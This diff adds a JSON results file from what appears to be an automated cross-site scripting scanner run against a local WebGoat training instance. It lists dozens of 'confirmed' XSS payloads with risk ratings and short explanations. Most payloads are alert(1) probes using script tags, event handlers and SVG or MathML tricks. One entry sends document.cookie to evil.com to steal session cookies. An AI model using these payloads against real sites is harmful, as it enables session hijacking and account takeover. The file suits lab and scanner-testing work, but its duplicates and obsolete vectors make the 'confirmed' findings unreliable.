@@ -1,0 +1,444 @@
+{
+    "confirmed_vulnerabilities": [
+        {
+            "timestamp": "2025-05-20T14:58:59.849162",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<script>alert(1)</script>",
+            "risk": "high",
+            "explanation": "Classic XSS payload that injects a script tag executing alert immediately; high risk as many filters fail to block this simple vector."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:00.997876",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "\"><script>alert(1)</script>",
+            "risk": "high",
+            "explanation": "Payload breaks out of an HTML attribute or tag context to inject a script tag; very effective for attribute injection points."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:01.009364",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<img src=x onerror=alert(1)>",
+            "risk": "high",
+            "explanation": "Injects an image with invalid src that triggers the onerror event handler, executing arbitrary JavaScript; widely supported event."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:01.071307",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<svg/onload=alert(1)>",
+            "risk": "high",
+            "explanation": "Uses SVG tag\u2019s onload event to execute JavaScript immediately upon SVG loading; SVG tags often bypass traditional HTML sanitizers."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:01.113510",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<body onload=alert(1)>",
+            "risk": "high",
+            "explanation": "Injects JavaScript on the body element\u2019s load event, triggering execution as the page loads; highly effective in full HTML injection."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:01.170924",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<iframe src='javascript:alert(1)'></iframe>",
+            "risk": "high",
+            "explanation": "Iframe tag loads JavaScript URL, executing alert; often blocked but very dangerous if allowed as it can run arbitrary JS."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:01.226002",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<input autofocus onfocus=alert(1)>",
+            "risk": "high",
+            "explanation": "Input element auto-focused triggers alert via onfocus event; effective in forms or input fields with autofocusing."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:01.282491",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<a href=javascript:alert(1)>Click me</a>",
+            "risk": "high",
+            "explanation": "Anchor tag with javascript URI in href executes alert on click; common vector when hrefs are not sanitized."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:01.339688",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<video><source onerror=alert(1)></video>",
+            "risk": "high",
+            "explanation": "Video source error triggers alert via onerror event; exploits media elements for JavaScript execution."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:01.410142",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<math href=\"javascript:alert(1)\">X</math>",
+            "risk": "high",
+            "explanation": "MathML element with href attribute set to javascript URI, triggering alert; bypasses filters not checking MathML."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:01.465133",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<svg><animate onbegin=alert(1)></animate></svg>",
+            "risk": "high",
+            "explanation": "SVG animation element triggers alert on animation start event; uncommon but effective in SVG contexts."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:01.526456",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<details open ontoggle=alert(1)>Click me</details>",
+            "risk": "high",
+            "explanation": "Details tag ontoggle event fires alert when the element toggles open/close; often overlooked by filters."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:01.576924",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<style>@keyframes x{}</style><div style='animation-name:x' onanimationstart=alert(1)>X</div>",
+            "risk": "high",
+            "explanation": "CSS animation triggers JavaScript on animation start event, blending CSS and JS for execution."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:01.627015",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<input oninput=alert(1)>",
+            "risk": "high",
+            "explanation": "Triggers alert when user inputs text, useful for interactive injection points where input events occur."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:01.687796",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<form action=javascript:alert(1)>",
+            "risk": "high",
+            "explanation": "Form submission runs JavaScript in action attribute, enabling alert when submitted; dangerous in forms."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:01.746285",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<button formaction=javascript:alert(1)>Click</button>",
+            "risk": "high",
+            "explanation": "Button with formaction set to javascript URI executes alert upon clicking; exploits form controls."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:01.795117",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<img src='x' onmouseenter='alert(1)'>",
+            "risk": "medium",
+            "explanation": "Triggers alert when mouse enters image area; requires user interaction but can be stealthy."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:01.851743",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<a href=\"#\" onfocus=\"alert(1)\" tabindex=\"0\">test</a>",
+            "risk": "medium",
+            "explanation": "Anchor element triggers alert when focused (e.g., tabbed into); needs keyboard interaction."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:01.905522",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<a href=\"#\" onfocus=\"alert(1)\" tabindex=\"-1\">test</a>",
+            "risk": "medium",
+            "explanation": "Similar to above but tabindex=-1 removes from tab order; may be focused programmatically."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:01.967067",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<div style='animation-name:x;animation-duration:1s;animation-iteration-count:infinite;animation-direction:alternate;animation-timing-function:steps(1,end);animation-delay:0s;animation-play-state:running;animation-fill-mode:none;' onanimationstart=alert(1)>X</div>",
+            "risk": "medium",
+            "explanation": "CSS animation triggers alert on start; less common but valid vector combining CSS+JS."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:02.016683",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<details ontoggle='alert(1)'><summary>Click me</summary></details>",
+            "risk": "medium",
+            "explanation": "Similar to high risk details payload, but here without open attribute, requiring toggle by user."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:02.067141",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<body onmouseenter='alert(1)'>",
+            "risk": "medium",
+            "explanation": "Alert triggers when mouse enters page body; requires user interaction but can be unexpected."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:02.116526",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<div draggable='true' ondragstart='alert(1)'>Drag me</div>",
+            "risk": "medium",
+            "explanation": "JavaScript triggered on drag start event; requires user to drag element."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:02.168968",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<img src=x onabort=alert(1)>",
+            "risk": "medium",
+            "explanation": "Alert triggers if image loading is aborted; rare but possible event vector."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:02.216853",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<object data='javascript:alert(1)'></object>",
+            "risk": "medium",
+            "explanation": "Object tag loads javascript URI, executing alert; less common but valid injection."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:03.085551",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<script>document.location='http://evil.com?cookie='+document.cookie</script>",
+            "risk": "high",
+            "explanation": "Steals cookies by sending them to an attacker-controlled server; critical risk."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:03.135654",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<svg><script>alert(1)</script></svg>",
+            "risk": "high",
+            "explanation": "Injects script inside SVG tag; SVG content often less sanitized."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:03.184970",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<math><script>alert(1)</script></math>",
+            "risk": "high",
+            "explanation": "Inject script inside MathML element; bypasses some filters."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:03.235976",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<video onplay=alert(1) autoplay>",
+            "risk": "high",
+            "explanation": "Triggers alert when video starts playing automatically."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:03.285616",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<audio src=x onerror=alert(1) autoplay>",
+            "risk": "high",
+            "explanation": "Audio element error triggers alert; autoplay ensures it runs immediately."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:03.328162",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<form><button formaction=javascript:alert(1)>Click</button></form>",
+            "risk": "high",
+            "explanation": "Form with button that triggers JS on form submission."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:03.387947",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<input type='image' src=x onerror=alert(1)>",
+            "risk": "high",
+            "explanation": "Image input triggers alert on error, useful in form contexts."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:03.435719",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<details ontoggle=alert(1) open>",
+            "risk": "high",
+            "explanation": "Details element toggles alert when open/close state changes."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:03.501756",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>",
+            "risk": "high",
+            "explanation": "ForeignObject allows injecting HTML/JS inside SVG, which may bypass filters."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:03.549466",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<div style='width:expression(alert(1))'>",
+            "risk": "high",
+            "explanation": "Old IE expression CSS injection that executes JS when style is evaluated."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:03.605191",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<a href='javascript:alert(String.fromCharCode(88,83,83))'>XSS</a>",
+            "risk": "medium",
+            "explanation": "JavaScript URI with obfuscated alert using char codes to evade simple filters."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:03.653833",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<input onblur=alert(1)>",
+            "risk": "medium",
+            "explanation": "Triggers alert when input loses focus; requires user interaction."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:03.714461",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<div onscroll=alert(1) style='overflow:auto;height:50px;'>Scroll me</div>",
+            "risk": "medium",
+            "explanation": "Executes JS on scroll event; user interaction needed but stealthy."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:03.760901",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<button onmousedown=alert(1)>Click me</button>",
+            "risk": "medium",
+            "explanation": "Triggers alert on mouse button press, earlier than click event."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:03.815829",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<img src=x onload=alert(1)>",
+            "risk": "medium",
+            "explanation": "Triggers alert when image loads successfully; less common but possible."
+        },
+        {
+            "timestamp": "2025-05-20T14:59:04.104740",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<script>window.onerror=alert;throw 'XSS'</script>",
+            "risk": "high",
+            "explanation": "No explanation provided"
+        },
+        {
+            "timestamp": "2025-05-20T14:59:04.167475",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<svg><script>alert(1)</script></svg>",
+            "risk": "high",
+            "explanation": "No explanation provided"
+        },
+        {
+            "timestamp": "2025-05-20T14:59:04.224459",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
+            "risk": "high",
+            "explanation": "No explanation provided"
+        },
+        {
+            "timestamp": "2025-05-20T14:59:04.276931",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<img src=x onerror=eval('alert(1)')>",
+            "risk": "high",
+            "explanation": "No explanation provided"
+        },
+        {
+            "timestamp": "2025-05-20T14:59:04.335819",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<object data='data:text/html,<script>alert(1)</script>'></object>",
+            "risk": "high",
+            "explanation": "No explanation provided"
+        },
+        {
+            "timestamp": "2025-05-20T14:59:04.380746",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<input type='image' src='x' onerror='alert(1)'>",
+            "risk": "medium",
+            "explanation": "No explanation provided"
+        },
+        {
+            "timestamp": "2025-05-20T14:59:04.435733",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<form><button formaction=\"javascript:alert(1)\">Click me</button></form>",
+            "risk": "high",
+            "explanation": "No explanation provided"
+        },
+        {
+            "timestamp": "2025-05-20T14:59:04.480061",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<details ontoggle='setTimeout(()=>alert(1),1000)'>Click</details>",
+            "risk": "medium",
+            "explanation": "No explanation provided"
+        },
+        {
+            "timestamp": "2025-05-20T14:59:04.521475",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>",
+            "risk": "high",
+            "explanation": "No explanation provided"
+        },
+        {
+            "timestamp": "2025-05-20T14:59:04.583971",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<div onpointerover='alert(1)'>Hover me</div>",
+            "risk": "medium",
+            "explanation": "No explanation provided"
+        },
+        {
+            "timestamp": "2025-05-20T14:59:04.623136",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<video onpause='alert(1)'><source src='video.mp4'></video>",
+            "risk": "medium",
+            "explanation": "No explanation provided"
+        },
+        {
+            "timestamp": "2025-05-20T14:59:04.686996",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<body onwheel='alert(1)'>",
+            "risk": "medium",
+            "explanation": "No explanation provided"
+        },
+        {
+            "timestamp": "2025-05-20T14:59:04.855668",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<svg><set attributeName='onactivate' to='alert(1)' begin='0s'/></svg>",
+            "risk": "medium",
+            "explanation": "No explanation provided"
+        },
+        {
+            "timestamp": "2025-05-20T14:59:04.954758",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<button oncontextmenu='alert(1)'>Right Click Me</button>",
+            "risk": "medium",
+            "explanation": "No explanation provided"
+        },
+        {
+            "timestamp": "2025-05-20T14:59:05.107784",
+            "url": "http://localhost:8080/WebGoat/register.mvc",
+            "vulnerability": "xss",
+            "payload": "<svg><animateMotion onbegin='alert(1)' dur='1s' repeatCount='1'/></svg>",
+            "risk": "medium",
+            "explanation": "No explanation provided"
+        }
+    ]
+}
